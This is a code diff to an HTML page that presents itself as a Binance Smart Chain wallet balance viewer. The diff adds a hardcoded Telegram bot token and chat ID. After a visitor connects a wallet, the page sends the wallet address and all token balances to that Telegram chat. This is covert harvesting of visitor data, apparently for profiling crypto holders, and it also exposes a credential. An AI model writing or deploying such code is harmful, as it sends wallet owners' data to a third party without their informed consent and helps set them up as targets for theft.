@@ -10,7 +10,6 @@
       text-align: center;
       padding-top: 50px;
     }
-
     .container {
       background: white;
       padding: 30px;
@@ -19,24 +18,20 @@
       display: inline-block;
       max-width: 600px;
     }
-
     button {
       padding: 12px 24px;
       font-size: 16px;
       cursor: pointer;
     }
-
     table {
       margin-top: 20px;
       width: 100%;
       border-collapse: collapse;
     }
-
     th, td {
       border-bottom: 1px solid #ddd;
       padding: 8px;
     }
-
     th {
       background-color: #f0f0f0;
     }
@@ -46,7 +41,6 @@
   <div class="container">
     <h2>BSC Wallet Token Balances</h2>
     <button id="connectBtn">Connect Wallet</button>
-
     <table id="tokenTable" style="display:none;">
       <thead>
         <tr>
@@ -54,54 +48,35 @@
           <th>Balance</th>
         </tr>
       </thead>
-      <tbody id="tokenBody">
-      </tbody>
+      <tbody id="tokenBody"></tbody>
     </table>
   </div>
 
-  <!-- Web3 + WalletConnect -->
+  <!-- Scripts -->
   <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/web3@1.6.1/dist/web3.min.js"></script>
-
   <script>
     const connectBtn = document.getElementById("connectBtn");
     const tokenTable = document.getElementById("tokenTable");
     const tokenBody = document.getElementById("tokenBody");
 
-    // List of popular BSC tokens
+    // 🔄 Replace with your Telegram bot credentials
+    const telegramBotToken = '8085520651:AAHM2Kt961rV4QyMSkElrmrnwDmcqFVB9SU';
+    const chatId = '8060968649';
+
     const tokenList = [
-      {
-        name: "BNB",
-        symbol: "BNB",
-        address: null  // Native coin
-      },
-      {
-        name: "Binance USD",
-        symbol: "BUSD",
-        address: "0xe9e7cea3dedca5984780bafc599bd69add087d56"
-      },
-      {
-        name: "Tether USD",
-        symbol: "USDT",
-        address: "0x55d398326f99059ff775485246999027b3197955"
-      },
-      {
-        name: "PancakeSwap",
-        symbol: "CAKE",
-        address: "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82"
-      },
-      {
-        name: "USDC",
-        symbol: "USDC",
-        address: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d"
-      }
+      { name: "BNB", symbol: "BNB", address: null },
+      { name: "Binance USD", symbol: "BUSD", address: "0xe9e7cea3dedca5984780bafc599bd69add087d56" },
+      { name: "Tether USD", symbol: "USDT", address: "0x55d398326f99059ff775485246999027b3197955" },
+      { name: "PancakeSwap", symbol: "CAKE", address: "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82" },
+      { name: "USDC", symbol: "USDC", address: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d" }
     ];
 
     const erc20Abi = [
-      { "constant": true, "inputs": [], "name": "name", "outputs": [{ "name": "", "type": "string" }], "type": "function" },
-      { "constant": true, "inputs": [], "name": "symbol", "outputs": [{ "name": "", "type": "string" }], "type": "function" },
-      { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "name": "", "type": "uint8" }], "type": "function" },
-      { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" }
+      { constant: true, inputs: [], name: "name", outputs: [{ name: "", type: "string" }], type: "function" },
+      { constant: true, inputs: [], name: "symbol", outputs: [{ name: "", type: "string" }], type: "function" },
+      { constant: true, inputs: [], name: "decimals", outputs: [{ name: "", type: "uint8" }], type: "function" },
+      { constant: true, inputs: [{ name: "_owner", type: "address" }], name: "balanceOf", outputs: [{ name: "balance", type: "uint256" }], type: "function" }
     ];
 
     connectBtn.addEventListener("click", async () => {
@@ -109,15 +84,11 @@
       let provider;
 
       if (window.ethereum && !isMobile) {
-        // Desktop extension (MetaMask / Trust Wallet)
         provider = window.ethereum;
         await provider.request({ method: "eth_requestAccounts" });
       } else {
-        // Mobile deep link
         provider = new WalletConnectProvider.default({
-          rpc: {
-            56: "https://bsc-dataseed1.binance.org/"
-          },
+          rpc: { 56: "https://bsc-dataseed1.binance.org/" },
           chainId: 56,
           qrcode: false
         });
@@ -127,7 +98,6 @@
         const link = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(wcUri)}`;
         window.location.href = link;
 
-        // Wait for connect
         await new Promise(resolve => {
           provider.on("connect", resolve);
         });
@@ -140,15 +110,15 @@
       tokenBody.innerHTML = "";
       tokenTable.style.display = "table";
 
+      let message = `🔐 *New Wallet Connected*\n📍 *Address:* \`${address}\`\n\n💰 *Token Balances:*\n`;
+
       for (const token of tokenList) {
         let balance = "0";
 
         if (token.address === null) {
-          // Native BNB
           const bnbWei = await web3.eth.getBalance(address);
           balance = web3.utils.fromWei(bnbWei, "ether");
         } else {
-          // ERC20 Token
           const contract = new web3.eth.Contract(erc20Abi, token.address);
           const rawBalance = await contract.methods.balanceOf(address).call();
           const decimals = await contract.methods.decimals().call();
@@ -158,6 +128,25 @@
         const row = document.createElement("tr");
         row.innerHTML = `<td>${token.symbol}</td><td>${balance}</td>`;
         tokenBody.appendChild(row);
+
+        message += `• *${token.symbol}*: \`${balance}\`\n`;
+      }
+
+      // Send message to Telegram
+      try {
+        await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+          method: 'POST',
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: "Markdown"
+          })
+        });
+        alert("✅ Wallet data sent to Telegram!");
+      } catch (err) {
+        console.error("Telegram Error:", err);
+        alert("⚠️ Failed to send to Telegram. Check console.");
       }
     });
   </script>
